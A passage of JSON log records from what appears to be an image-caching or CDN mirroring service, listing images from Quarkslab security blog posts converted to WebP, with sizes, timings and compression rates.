KB","compressRate":"54%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES6.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1472,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn32@2020_2/2020/08/25/01-15-16-212_4d278d28ff248a14.webp","sourceBytes":406123,"destBytes":349650,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2904,"convertSpendMs":927,"createdTime":"2020-08-25 09:15:14","host":"us-037*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"396.6 KB","destSize":"341.5 KB","compressRate":"86.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/kinibi_archi_reverser.png","sourceStatusCode":200,"destWidth":961,"destHeight":696,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn86@2020_3/2020/08/25/01-15-16-605_4d59503ae671a2ea.webp","sourceBytes":286482,"destBytes":125742,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2150,"convertSpendMs":47,"createdTime":"2020-08-25 09:15:15","host":"us-028*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"279.8 KB","destSize":"122.8 KB","compressRate":"43.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/arch_evolution.png","sourceStatusCode":200,"destWidth":3274,"destHeight":986,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn53@2020_3/2020/08/25/01-15-16-492_9e3bcffa88ba8717.webp","sourceBytes":353286,"destBytes":200542,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2658,"convertSpendMs":177,"createdTime":"2020-08-25 09:15:15","host":"us-016*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"345 KB","destSize":"195.8 KB","compressRate":"56.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_1.png","sourceStatusCode":200,"destWidth":2448,"destHeight":1172,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn52@2020_6/2020/08/25/01-15-16-862_b472f58b5e61aedd.webp","sourceBytes":216227,"destBytes":108130,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":5824,"convertSpendMs":3557,"createdTime":"2020-08-25 09:15:12","host":"us-035*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"211.2 KB","destSize":"105.6 KB","compressRate":"50%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES9.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1472,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn58@2020_4/2020/08/25/01-15-17-140_bee376bbacce6c60.webp","sourceBytes":402590,"destBytes":346936,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3077,"convertSpendMs":1102,"createdTime":"2020-08-25 09:15:15","host":"us-009*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"393.2 KB","destSize":"338.8 KB","compressRate":"86.2%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/noped.png","sourceStatusCode":200,"destWidth":744,"destHeight":1008,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn71@2020_1/2020/08/25/01-15-17-919_749b33323926d0b1.webp","sourceBytes":135884,"destBytes":31524,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1728,"convertSpendMs":83,"createdTime":"2020-08-25 09:15:17","host":"us-024*","referer":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html","linkMd5ListStr":"41cd2e745dd1c20533633d789273ed24","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"132.7 KB","destSize":"30.8 KB","compressRate":"23.2%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/scr.png","sourceStatusCode":200,"destWidth":2181,"destHeight":303,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn56@2020_6/2020/08/25/01-15-18-278_70b7f31aeeb27037.webp","sourceBytes":94771,"destBytes":66632,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1676,"convertSpendMs":103,"createdTime":"2020-08-25 09:15:17","host":"us-004*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"92.5 KB","destSize":"65.1 KB","compressRate":"70.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES8.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1476,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn75@2020_4/2020/08/25/01-15-17-467_9a7fb1617a321a1d.webp","sourceBytes":403010,"destBytes":345676,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":6935,"convertSpendMs":4693,"createdTime":"2020-08-25 09:15:12","host":"europe68*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"393.6 KB","destSize":"337.6 KB","compressRate":"85.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_xx.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1476,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn24@2020_2/2020/08/25/01-15-19-020_05aff9d52b81f3c1.webp","sourceBytes":349234,"destBytes":354436,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":6409,"convertSpendMs":4314,"createdTime":"2020-08-25 09:15:14","host":"europe63*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"341 KB","destSize":"346.1 KB","compressRate":"101.5%"}],"successGithubMap":{"myreaderx14":3,"myreaderx8":3,"myreaderx15":4,"myreaderx7":3,"myreaderx16":3,"myreaderx6":2,"myreaderx10":3,"myreaderx32":3,"myreaderx4":3,"myreaderx33":3,"myreaderx3":3,"myreaderx11":2,"myreaderx12":3,"myreaderx2":3,"myreaderx13":2,"myreaderx1":3,"myreaderx30":3,"myreaderx31":3,"myreaderx18":2,"myreaderx19":3,"myreaderx":4,"myreaderx25":4,"myreaderx27":4,"myreaderx21":4,"myreaderx22":2,"myreaderx23":3,"myreaderx24":3,"myreaderx5oss":2,"myreaderx29":3},"failGithubMap":{}}